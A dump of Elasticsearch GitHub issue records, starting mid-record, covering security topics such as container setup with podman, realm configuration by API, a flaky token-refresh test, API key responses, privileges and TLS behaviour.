Let us remove this file:
```
rm ~/podman/kibana/data/uuid
```

This will be our final run command for Kibana:
```
podman run --name kib-01 --net elastic -p 5601:5601 -v ~/podman/kibana/config/kibana.yml:/usr/share/kibana/config/kibana.yml:Z -v ~/podman/kibana/data/:/usr/share/kibana/data:Z -e SERVER_PUBLICBASEURL=http://192.168.10.44 -dt docker.elastic.co/kibana/kibana:8.3.3
```

Now I have working persistent configuration and I can generate systemd unit files (??). Let us also stop the containers and remove them:
```
cd ~/.config/systemd/user
podman generate systemd --new --files --name es01
podman generate systemd --new --files --name kib-01 

podman stop kib-01
podman rm kib-01
podman stop es01
podman rm es01
```

Using `systemctl` for now:
```
systemctl --user enable --now container-es01.service
systemctl --user enable --now container-kib-01.service
```

But hey, what about passwords? 
This throws a lot of errors; although in the end it works and gives me a valid password for the `elastic` user:
```
podman exec -it es01 /usr/share/elasticsearch/bin/elasticsearch-reset-password -u elastic
```

I can reboot the host computer and everything works without having to log in (`loginctl enable-linger`). 

The transport is now SSL encrypted, I have all the bells and whistles offered from the auto-configuration?I found that if I explicitly set `xpack.security.enabled: true` and bind mount a keystore that has a `bootstrap.password` set, then bind mounting the elasticsearch.yml works fine. I haven't dug into the details of why or if that is correct behavior, but that is what I have observed.

Here is very simple single node cluster with a bind mounted elasticsearch.yml and keystore : https://github.com/jakelandis/es-docker-simple > I found that if I explicitly set `xpack.security.enabled: true` and bind mount a keystore that has a `bootstrap.password` set, then bind mounting the elasticsearch.yml works fine. I haven't dug into the details of why or if that is correct behavior, but that is what I have observed.
> 
> Here is very simple single node cluster with a bind mounted elasticsearch.yml and keystore : https://github.com/jakelandis/es-docker-simple

setting `xpack.security.enabled: true` in the custom elasticsearch.yaml fixed it for me , now its get mounted ,> I found that if I explicitly set `xpack.security.enabled: true` and bind mount a keystore that has a `bootstrap.password` set, then bind mounting the elasticsearch.yml works fine. I haven't dug into the details of why or if that is correct behavior, but that is what I have observed.

This is expected because [enabling security explicitly makes the startup process skip security auto-configuration](https://github.com/elastic/elasticsearch/blob/06226397fb95c1e72693008ebf929a7066e22c64/x-pack/plugin/security/cli/src/main/java/org/elasticsearch/xpack/security/cli/AutoConfigureNode.java#L215-L217). The original error was thrown during security auto-configuration. Since it is skipped, the error no longer happens. But I believe the intention for this issue is whether we could either (1) detect the original bind mount situation and automatically skip auto configuration (IIUC, this is our preference) or (2) have auto configuration work if the the bind mount meets certain requirements.So.. no fix for this yet?

Anyways, try my workaround...

On your docker command line:
-v /absolute/path/to/a/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml
Make sure the volume file ""/absolute/path/to/a/elasticsearch.yml"" exists and is writable.

Also, elasticsearch.yml should not be empty.  

My example configuration:

cluster.name: ""docker-cluster""
network.host: 0.0.0.0
xpack.license.self_generated.type: trial
xpack.security.enabled: true
",no,">bug,Team:Security,v8.0.2,v8.1.4,:Security/AutoConfiguration,v8.6.0,"
elastic/elasticsearch,390603630,"Configure security realms via API","I'm interested in whether Elasticsearch could allow security realm configuration via an API. The use-case is avoiding a restart for each configuration change.

cc @AlexP-Elastic in case there's more detail he can provide.","Pinging @elastic/es-securityWe discussed this today in our team meeting. We would like to understand a little bit more about the requirements and the use cases associated with this request before we see what plan we can possibly come up to address this. 

@pugnascotia could you add a little more detail ? Are we talking about adding new realms or making configuration changes to existing enabled ones ? If there are specific configuration options that are more important or will be more frequent used than others, we'd like to know also as these could be satisfied with specific APIs instead. Ping @AlexP-Elastic who can probably explain it better.Pinging @daniel-bytes tooI believe for our use case it would mean adding or modifying realms via an API instead of cluster settings, which would mean basically any available realm setting.

The flow we are looking at now in Cloud is that we have some ""authentication profile"" APIs (basically security realms + role mappings) which stores data in our Zookeeper data store.  If any realm data is changed, we need to kick off a new Plan, which will use the Zookeeper data to inject settings into the cluster configuration for each instance.  If role mappings change, we can apply them immediately since they have an API available.

I think the hope here is that, if we could instead apply these settings via an API and not require any cluster reboot then our APIs would be significantly simpler and faster for the end user as they will not have to wait for the plan change to take effect, as well as dealing with any potential issues that can arise from running a plan change to begin with.  @AlexP-Elastic might have additional thoughts on this as well.Configuration via API might solve a problem for larger clusters especially on ESS/ECE.

Background: When configuring SAML, we need to configure both Elasticsearch and Kibana. On ESS, no problem, we just put the correct things in ""user setting overrides"" and save it.

Problem: On ESS, nodes appear to not be reused. Configuration changes cause some kind of ""plan"" change which makes ESS bring up new replacement nodes and copy the data to the new nodes. The impact of this is that for medium to large clusters, this migration can take longer than Kibana's plan change is willing to wait (20 minutes). A 1-hour plan change (caused by heavy data copying?) causes Kibana's plan change to fail and be rolled back.

User experience: The result is that Elasticsearch is configured on ESS, but Kibana's configuration attempt is aborted.

Complication: This is caused partly by Kibana, on startup, asking Elasticsearch for SAML configuration details, and prior to Elasticsearch being completely configured, Kibana keeps trying(?) and eventually ESS kills the attempt to configure Kibana.

One solution would be to allow realm configuration via API. This would solve the problem because deploying SAML would not require, on ESS, a complete cluster restart (and data migration to new nodes). As a benefit, realms could be deployed nearly instantly instead of waiting for a full cluster restart (on ESS, for tiny clusters, this is at least 5 minutes for a full restart on a plan change).

A separate solution would be to have ESS improve how it deploys configuration such that it did not take hours to change `elasticsearch.yml` on a large cluster, but I don't know if that's the right solution.

Separately, if there were an API to configure realms, one could automate SAML configuration regardless of the substrate/platform that runs Elasticsearch. For example, on Okta, we create 1 Okta App per Kibana endpoint to configure SAML. At this time, we have no way to deploy SAML to Elasticsearch/Kibana without involving a human copy/pasting into the correct place (ESS, ECE, ECK, self-hosted elasticsearch.yml, etc).

One extra note, is that this API should also involve Kibana, because Kibana, at least for SAML, requires special configuration in its `kibana.yml` as well. That said, Kibana is out of scope for this particular Elasticsearch issue, but in scope for the problem ;)As a side note - you can apply config changes on Cloud without data migrations, but you still to restart each node, wait for it to recover, wait for the cluster to settle, then move on to the next node, and can can take a long time in itself.> apply config changes on Cloud 

How? I was helping @mindbat with some SAML automation and their cluster (~300gb) took quite a while to deploy presumably due to data migration? Maybe it's not due to data migration -- my thought was based on assumption and not based on any significant observation.There's an option when applying a plan change - you can choose the strategy you want: grow-and-shrink, rolling grow-and-shrink (I think it is), or inline (i.e. don't create new nodes). The UI will disable inline for some changes, but I think they're most topology related (so you can't do an inline plan change if you're changing the node size, for example).(Note you currently can't select this as an ESS user, only an ESS admin or ECE user - but it's ""coming soon"" to ESS .. the vast majority of the config change time is currently data migration as you believed, it takes a minutes or so per node to shutdown/bring back up again, and it can take a few minutes to reload all the shards for that instance)Beyond customer adding their IdP on their clusters, we will also need dymamic addition/removal of security realms in the context of Cloud SSO to allow customers to use their own IdP to login to Elastic Cloud.

Custom IdPs on Cloud is also a strong requirement for FedRAMP. In https://github.com/elastic/cloud/issues/34897: ""Support for agencies to bring their own IdP is a federal mandate"" Cloud is currently working on a new feature to use standby clusters as a way to provide instantly available deployments to first time users (see the corresponding Meta ticket here: https://github.com/elastic/cloud/issues/81970). We basically ""cache"" pre-started deployments and re-configure them on the fly when assigning them to a user, eliminating the five minute waiting time that is usually required to start up a deployment from scratch.

The problem is, on Cloud, when a user names their deployment the corresponding deployment alias will also be changed to a user-friendly URL (e.g. my-deployment-ab9164.es.eastus2.azure.elastic-cloud.com instead of ab9164848c504e57a0830b014f2a0c9e.es.eastus2.azure.elastic-cloud.com). When changing the URL, we need to update the SAML configuration for SSO keep working as e.g. the callback URL changes. Currently this requires a cluster restart, which mean a full plan execution on cloud, which takes a couple of minutes. We want to avoid as this negates the previously gained startup speed advantage.

Hence it would be nice if the ES team could look into re-prioritzing this issue as it would enable us to re-configure the SAML settings without a restart.**Alternative Proposal**
Elasticsearch should make outgoing API calls to a Config Server, like Spring Cloud's Config Server. It is a cloud proven design.

Don't implement as incoming API calls. A central Config Server is more optimal than each of the 12 Elasticsearch team implementing a different solution to the same underlying problem of config reload.

**Duplication**
Both of these Elasticsearch features seem to want to reload config at runtime without a restart.
- Configure Security via APIs without a restart (i.e. this issue)
- Configure Desired Nodes via APIs without a restart (i.e. separate feature)

**Proposal**
I proposed a different solution in the Desired Nodes doc. Instead of an incoming bespoke API for a specific use case, create an outgoing API that can be reused by all 12 Elasticsearch teams. For example, follow the same design as Spring Cloud's Config Server. Each Elasticsearch team would subscribe to the Config Server to listen for changes, filter on changes in their config subset, and apply changes at runtime if required.

**Elasticsearch start and runtime**
- Build the config up in layers from different sources:
-- a) elasticsearch.yml
-- b) JVM properties
-- c) If enabled, make REST GET calls for key/value pairs in a Config Server (i.e. augment or override settings from a and b)
- Subscribe (or long poll) for any CRUD changes to key/value pairs in the Config Server

**Operators**
Spring Cloud's Config Server implements all of these features in a cloud proven architecture:
- Write config key/value pairs in Config Server via a simple REST APIs (POST, PUT, DELETE)
- Use persistence and backups for DR
- Run multiple Config Server instances for load balancing and HA
- Optionally protect data with a HSM, for any customers wanting FIPS 140-2 Level 1/2/3

**Examples**
When an operator makes a change to key/value pairs in the Config Server:
- Security setting listener gets notified, checks if its settings changed, and applies updates at runtime.
- Desired nodes listener gets notified, checks if its settings changed, and applies updates at runtime.

**Generalization**
- Elasticsearch team (1-12) listeners get notified, each checks if their settings changed, and applies updates at runtime if required.**Clarification**
Incoming or outgoing API will work, but I think it should be generic key/value config settings. The point is I think we should consider reuse of the API for all of Elasticsearch, not just specific areas.

**Incoming API Alternative**
Implement as a simple key/value REST CRUD API.
- GET reads a setting, except values from Elasticsearch keystore
- POST adds a setting
- PUT updates a setting
- DELETE remove a setting

Different parts of Elasticsearch can subscribe for incoming updates, and filter for different updates. When an update comes in for a specific area, that area of code will react.

This approach is similar to the output API proposal to a Config Server, but eliminates the need for the remote Config Server.",no,":Security/Authentication,Team:Security,"
elastic/elasticsearch,1193190731,"[CI] TokenAuthIntegTests testRefreshingMultipleTimesWithinWindowSucceeds failing","Failed only 7 times in the last 28 days, and started failing in the last week or so:
https://gradle-enterprise.elastic.co/scans/tests?search.startTimeMax=1649167149683&search.startTimeMin=1646085600000&search.timeZoneId=Europe/Bucharest&tests.container=org.elasticsearch.xpack.security.authc.TokenAuthIntegTests&tests.sortField=FAILED&tests.test=testRefreshingMultipleTimesWithinWindowSucceeds&tests.unstableOnly=true

And sometimes the assertion is:
```
java.lang.AssertionError: 	
Expected: <1>	
     but: was <3>
```

**Build scan:**
https://gradle-enterprise.elastic.co/s/oit7vnoh6abfs/tests/:x-pack:plugin:security:internalClusterTest/org.elasticsearch.xpack.security.authc.TokenAuthIntegTests/testRefreshingMultipleTimesWithinWindowSucceeds

**Reproduction line:**
`./gradlew ':x-pack:plugin:security:internalClusterTest' --tests ""org.elasticsearch.xpack.security.authc.TokenAuthIntegTests.testRefreshingMultipleTimesWithinWindowSucceeds"" -Dtests.seed=F7EB4530E2A3CA68 -Dbuild.snapshot=false -Dtests.jvm.argline=""-Dbuild.snapshot=false"" -Dtests.locale=es-PA -Dtests.timezone=America/Rankin_Inlet -Druntime.java=17`

**Applicable branches:**
master, 8.2

**Reproduces locally?:**
No

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.authc.TokenAuthIntegTests&tests.test=testRefreshingMultipleTimesWithinWindowSucceeds

**Failure excerpt:**
```
java.lang.AssertionError: 
Expected: <1>
     but: was <2>

  at __randomizedtesting.SeedInfo.seed([F7EB4530E2A3CA68:D6E525F2AF664A1C]:0)
  at org.hamcrest.MatcherAssert.assertThat(MatcherAssert.java:18)
  at org.junit.Assert.assertThat(Assert.java:956)
  at org.junit.Assert.assertThat(Assert.java:923)
  at org.elasticsearch.xpack.security.authc.TokenAuthIntegTests.testRefreshingMultipleTimesWithinWindowSucceeds(TokenAuthIntegTests.java:706)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)
  at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:568)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
  at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:824)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:475)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
  at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:831)
  at java.lang.Thread.run(Thread.java:833)

```","Pinging @elastic/es-security (Team:Security)Not muting for now.Another failure in https://gradle-enterprise.elastic.co/s/n7m5kieb32uocFailed again today: https://gradle-enterprise.elastic.co/s/ocxvyut2dr5cg/console-log?task=:x-pack:plugin:security:internalClusterTestFailed again in my PR build: https://gradle-enterprise.elastic.co/s/kpanh6km54s56/console-log?task=:x-pack:plugin:security:internalClusterTestPhew, okay here is what I found:

**TL;DR** the test fails during the authentication step because a refresh token that is already available on a primary shard is not yet available on a replica shard

High level, the test fails under the following conditions:

Assume there are two nodes and the `.security-token` index has one primary shard and one replica

1. Thread `t1` attempts to refresh a token, and succeeds
1. The token doc is written to the primary shard and becomes available for Get requests
1. Thread `t2` attempts to refresh, finds there is a superseding token, and successfully fetches the superseding token from the primary shard
1. `t2` uses the refreshed token it fetched to authenticate, the request is routed to the replica where the token is not yet available. This leads to an authentication failure (and therefore a 401 among `authStatuses` here: https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/internalClusterTest/java/org/elasticsearch/xpack/security/authc/TokenAuthIntegTests.java#L487)

Adding a `Thread.sleep()` to `IndexShard::applyIndexOperationOnReplica` to artificially delay the replica write helps reproduce the issue reliably.

I'll look into possible fixes and check in with @elastic/es-security next. This is [a known issue](https://github.com/elastic/elasticsearch/issues/55816#issuecomment-620913282). Unfortunately the original issue (#55816) was closed incorrectly because it was reused for 3 different failure scenarios. But this particular failure was never fixed for master. It was on mute until incorrectly [unmuted](https://github.com/elastic/elasticsearch/pull/85010/files#diff-9c0b337484d0450ee6109453bc351535a3118f25d5c3335b9fbd4d425cfd67ab) recently (also because the associated issue was incorrectly closed).

We had quite lengthy discussion on potential fixes. I can share more details in a separate channel.fyi another one today: https://gradle-enterprise.elastic.co/s/wajlsuo3khpbkhttps://gradle-enterprise.elastic.co/s/ypguwuyqynrm2muted for 8.2",no,">test-failure,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1265576783,"Native realm docs are out of date with ES8 behaviour","### Description

The [docs for the native realm](https://www.elastic.co/guide/en/elasticsearch/reference/current/native-realm.html) say:

> The native realm is available by default when no other realms are configured. If other realm settings have been configured in elasticsearch.yml, you must add the native realm to the realm chain.

However, [since ES 8](https://www.elastic.co/guide/en/elasticsearch/reference/master/migrating-8.0.html#breaking_80_security_changes) the native realm is always enabled unless explicitly disabled (see #69096).

We should 
1. Correct that statement.
2. Provide an example of how to disable the native realm.
","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)The [realm chains](https://www.elastic.co/guide/en/elasticsearch/reference/current/realm-chains.html) docs page does provide an example of disabling the native realm.The [file realm docs](https://www.elastic.co/guide/en/elasticsearch/reference/current/file-realm.html#file-realm) have a similar issue:
> When you configure realms in elasticsearch.yml, only the realms you specify are used for authentication. To use the file realm you must explicitly include it in the realm chain
",no,">bug,>docs,:Security/Authentication,Team:Docs,Team:Security,"
elastic/elasticsearch,991048830,"LDAP better log messages empty password for bind dn","**Elasticsearch version** (`bin/elasticsearch --version`): 7.14.1

**Description of the problem including expected versus actual behavior**:

This error message: `[2021-05-19T07:25:55,868][WARN ][o.e.x.s.a.AuthenticationService] [elasticsearch01] Authentication to realm my_ad failed - authenticate failed (Caused by LDAPException(resultCode=89 (parameter error), errorMessage='Simple bind operations are not allowed to contain a bind DN without a password.', ldapSDKVersion=4.0.8, revision=28812))` is not really helpful.

* You might think that there is an issue with the `bind user` that the Elasticsearch keystore has an empty password.
* This is not directly the case. This message is thrown when an user tries to authenticate with an empty password.

**Steps to reproduce**:

 1. Setup active directory in Elasticsearch
 2. Configure bind user + bind password (in Elasticsearch keystore)
 3. Create e.g. metricbeat configuration, using a keystore.
 4. Add a wrong password to the keystore
 5. Try logging in
 5. Add an empty password to the keystore
 6. Try logging in
7. The error from above should be shown in the Elasticsearch logs.


**Expected behavior**

The error message should contain the following information at least
* Hostname
* User tried to authenticate

E.g. an example line should be: 
[2021-05-19T07:25:55,868][WARN ][o.e.x.s.a.AuthenticationService] [elasticsearch01] Authentication to realm my_ad failed - authenticate failed `for metricbeathost with user metricbeat-writer` (Caused by LDAPException(resultCode=89 (parameter error), errorMessage='Simple bind operations are not allowed to contain a bind DN without a password.', ldapSDKVersion=4.0.8, revision=28812))

It is possible to show the `user` by setting the following settings: (thanks to @ckauf for showing me this)

```json
PUT /_cluster/settings
{
  ""transient"": {
    ""logger.org.elasticsearch.xpack.security.authc"": ""debug""
  }
}
```

After that you can see multiple messages around the one shown above. However, you still have to correlate on your own and if you face multiple failed authentication for various users this can be difficult to track down.

Another way is to use the audit logging, which again works but is not ideal as you still need to correlate on your own again.

**To discuss**
Should enabling any additional realm automatically enable the minimum audit configuration for login & logouts? ","Pinging @elastic/es-security (Team:Security)",no,">bug,:Security/Authentication,Team:Security,"
elastic/elasticsearch,902451655,"Create API key call does not return metadata","**Elasticsearch version**: master

**Description of the problem including expected versus actual behavior**:

When creating an API key with optional metadata, the metadata is not returned as part of the POST request. Instead, users have to manually make another GET request. This is unexpected, inconsistent with REST and leads to unnecessary API calls for clients. 

**Steps to reproduce**:

Request:

```
POST /_security/api_key
{
  ""name"": ""my-api-key"",
  ""metadata"": {
    ""foo"": ""bar""
  }
}
```

Response:

```
{
  ""id"" : ""6rAAqXkBBwYTxE1tVdiY"",
  ""name"" : ""my-api-key"",
  ""api_key"" : ""i59SgK_DR5W4iA0MBtH5QA""
}
```

Expected:

```
{
  ""id"" : ""6rAAqXkBBwYTxE1tVdiY"",
  ""name"" : ""my-api-key"",
  ""api_key"" : ""i59SgK_DR5W4iA0MBtH5QA"",
  ""metadata"": {
    ""foo"": ""bar""
  }
}
```","Pinging @elastic/es-security (Team:Security)Why do you expect values that are specified in the request to be returned in the response?

That is not true for the other security APIs (users, roles, role mappings). In general, it amounts to unnecessary network traffic just to repeat the caller's parameters back to them.

What problem does it solve for you?I'm not suggesting to return all request params in the response. I'm suggesting to return the resource that was created as part of the response. 

This is a common pattern which makes it easier to integrate since you don't need make an additionally GET request to render information about the created API key in e.g. a confirmation callout. A couple more bytes in the response for the metadata field isn't really an issue since web performance is primarily impacted by the number of requests, rather than the response size itself. 

The current behaviour is also strange and inconsistent from an API design point of view since all other fields are returned (e.g. API key `name` and `expiration` date) but `metadata` is not. ",no,">bug,:Security/Security,Team:Security,"
elastic/elasticsearch,493436315,"Keystore entries last modified timestamp attribute","Keystore values cannot be printed by the `list` keystore sub-command (they are intentionally hidden). Also, there is no other metadata that can be associated with keystore entries. Hence, there is no way for the administrator, or automation scripts, to tell which version of the secure setting value is currently stored, only that it exists. In some scenario this implies restarting the node only to reread the same identical keystore setting.

The ""last modified timestamp"" attribute is easier to implement and would probably cover most cases, but general metadata for each keystore entry might be preferable. I propose we first implement the ""last modified timestamp"" attribute and only on further needs proceed with adding user-defined associated metadata.

Suggested in https://discuss.elastic.co/t/verify-if-elasticsearch-keystore-value-changed/199041
","Pinging @elastic/es-security",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,621751674,"Enable analyze API to users without manage privilege ","I tried to use [analyze API](https://www.elastic.co/guide/en/elasticsearch/reference/7.7/indices-analyze.html) in my app that uses read-only user credentials and noticed missing privileges error. I looked into [privileges documentation](https://www.elastic.co/guide/en/elasticsearch/reference/7.7/security-privileges.html#privileges-list-indices) and to my surprise found that I need my user to have `manage` index privilege, that enables the following capabilities:
> All monitor privileges plus index administration (aliases, analyze, cache clear, close, delete, exists, flush, mapping, open, force merge, refresh, settings, search shards, templates, validate). 

I think that the granularity here is not right - the ability to run analyze API should not give my user the privilege of closing/deleting an index.

One could argue that a user that has `read` capabilities should also be able to use analyze API, as analysis happens in search queries anyway (although the details are not exposed there).

Another candidate might be a `view_index_metadata` privilege - this one allows to look into settings so one can see index analyzers definition or even see how it works by looking how ES queries get rewritten to Lucene queries with [Validate API](https://www.elastic.co/guide/en/elasticsearch/reference/7.7/search-validate.html) (`rewrite=true` query parameter).

Or maybe Analyze needs its own privilege? 🤷‍♂️ 

Honestly, anything would work for me as long as my users can use Analyze API with me being sure that the cannot mess with the data (and that includes not being able to close/delete the index).","Pinging @elastic/es-security (:Security/Authorization)+1, we are also facing a similar issue. It would be great if we can have more granular permission for _analyze operation.+1 - see also https://github.com/elastic/elasticsearch/issues/47500",no,">enhancement,:Security/Authorization,"
elastic/elasticsearch,643615839,"Built-in user with minimal permissions for Beats","As a user that is configuring Beats, I would like to be able to use a single, built-in user that has minimal set of permissions that allow to both setup, run and monitor Beats.

Today, I would either use (out of convenience) an existing user that has a superset of needed permission or create user that has a [number of roles/permissions](https://www.elastic.co/guide/en/beats/filebeat/7.8/feature-roles.html). These can also change between ES versions (`7.3.0` - `monitoring_user` to `remote_monitoring_user`, `7.5.0` - `index` to `create_doc`, `7.7.0` - `kibana_user` to `kibana_admin`, etc.) which means that it needs to be reviewed before upgrading.
","Pinging @elastic/es-security (:Security/Security)@ycombinator can you please take a look at the above ask?The obstacle that has stopped us doing this in the past is that beats can be configured to write to any index, so the ""minimal permissions"" will either be too minimal for many use cases (because they only allow writes to `filebeat-*`, `metricbeat-*` etc), or not be minimal at all (because they allow writes to all indices).

We had some idea of tackling this in a slightly different way in https://github.com/elastic/elasticsearch/issues/38676, but given the direction Fleet is taking, the need should be reduced.",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,534803094,"Test with BCJSSE in FIPS 140 mode for 7.x","In https://github.com/elastic/elasticsearch/pull/49485, we elected to keep testing with SunJSSE in FIPS 140 mode for Java 8. 

We should also test with BCJSSE in FIPS 140 mode as our users might use that SSL provider in FIPS mode ","Pinging @elastic/es-security (:Security/Security)Pinging @elastic/es-core-infra (:Core/Infra/Build)",no,">enhancement,:Delivery/Build,:Security/Security,Team:Security,Team:Delivery,"
elastic/elasticsearch,817851454,"'network.host' and 'xpack.security.authc.api_key.enabled: true' together, causes failure to start","**Elasticsearch version** (`bin/elasticsearch --version`): 7.11.1

**Plugins installed**: [none]

**JVM version** (`java -version`): openjdk 11.0.10.0.9

**OS version** (`uname -a` if on a Unix-like system): fedora 33 (kernel 5.10.17)

**Description of the problem including expected versus actual behavior**: 
While trying to add 'xpack.security.authc.api_key.enabled: true
' to the elasticsearch.yml config, which also has the 'network.host' option, this error results during startup and fails to load the application:

```
HTTPS is required in order to use the API key service; please enable HTTPS using the [xpack.security.http.ssl.enabled] setting or disable the API key service using the [xpack.security.authc.api_key.enabled] setting
```

Using either the current IP address assigned to the machine or '0.0.0.0' results in this error

**Steps to reproduce**:

Please include a *minimal* but *complete* recreation of the problem,
including (e.g.) index creation, mappings, settings, query etc.  The easier
you make for us to reproduce it, the more likely that somebody will take the
time to look at it.

 1. add 'xpack.security.authc.api_key.enabled: true' to elasticsearch.yml
 2. add 'network.host: 0.0.0.0' to elasticsearch.yml
 3. run /bin/elasticsearch


","This is by design.

Setting the node to bind to a non-local address enables [bootstrap checks](https://www.elastic.co/guide/en/elasticsearch/reference/current/bootstrap-checks.html), one of which is to enforce that the API Key Service may only be used if SSL is enabled for http.

Pinging @elastic/es-security (Team:Security)ok. Makes sense. 
The documentation is a somewhat mis-leading for Enterprise Search, as it just says to set `xpack.security.authc.api_key.enabled: true` setting and go. ",no,">bug,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1049872894,"Windows Service installation and Security on by default","Elasticsearch can be [started as a service in windows](https://www.elastic.co/guide/en/elasticsearch/reference/current/zip-windows.html#windows-service). When this happens `elasticsearch.bat` is not used and auto-configuration doesn't run. In such cases authentication is enabled and users can use `elasticsearch-reset-password -u elastic` in order to get the password for the elastic user. TLS auto-configuration is not triggered so users would need to enable TLS manually and enrollment process doesnt' work for kibana or other nodes since it depends on the nodes being auto-configured for TLS .

We should investigate if it is possible to do the auto-configuration for TLS as part of the service installation ","Pinging @elastic/es-security (Team:Security)",no,">bug,Team:Security,:Security/AutoConfiguration,v8.6.0,"
elastic/elasticsearch,317454877,"Support Azure Active Directory","*Original comment by @joshbressers:*

We see requests to support AAD. I suspect we'll need to add this to x-pack as my understanding is they aren't doing OAuth in a generic manner.","*Original comment by @jaymode:*

This should be a pretty straightforward realm to add (outside of testing). Microsoft provides a java library for Azure AD https://github.com/AzureAD/azure-activedirectory-library-for-java*Original comment by @tvernum:*

I believe AAD supports SAML.*Original comment by @tvernum:*

The SAML Realm supports AAD, but SAML to on-prem apps is a platinum feature for AAD so we may get requests for integration at the ""basic"" AAD level.To clarify is this for the azure plugin for snapshots? or is for a different azure plugin ?   I want to file an issue for the Azure snapshot plugin to support Managed Service Identities ( see https://docs.microsoft.com/en-us/azure/active-directory/managed-service-identity/tutorial-linux-vm-access-storage-access-key ) but don't want to create a duplicate issue.   ( note: in that tutorial it has you hard code the subscription ID and Resource group, but those can be fetched from instance metadata https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service ) Even supporting Azure Active Directory Service Principals would be an addition.Any movement on this? No, we support AzureAD via SAML for authentication to Kibana/Elasticsearch and have no immediate plans to do anything more in the authentication space.

But from what you've written, I don't think you're looking for additional authentication options - I assume you're after support for service principals in for the Azure Snapshot repository. If so, this isn't the issue for that.@tvernum not having AzureAD integrated in such as way as to permit use of the ""run-as"" feature in ES is a potential blocker for one of my users",no,">feature,:Security/Authentication,Team:Security,"
elastic/elasticsearch,532216219,"xpack.security.transport.ssl.enabled side effect: Basic authentication is enabled without being requested","<!-- Bug report -->

**Elasticsearch version** (`bin/elasticsearch --version`): 6.8.5

**Plugins installed**: [analysis-icu]

**JVM version** (`java -version`): 

**OS version** (`uname -a` if on a Unix-like system):

**Description of the problem including expected versus actual behavior**:

When ""xpack.security.transport.ssl.enabled"" is set to true, as an unintended side effect Basic Authentication is enabled.

This breaks all servers where search-guard-ssl has been removed.

**Steps to reproduce**:

 1. Enable TLS transport with ""xpack.security.transport.ssl.enabled"" as per https://www.elastic.co/blog/getting-started-with-elasticsearch-security
 2. While TLS on the transport connections now works, access to the cluster through HTTP is now broken, as all requests are rejected requesting unexpected basic authentication.
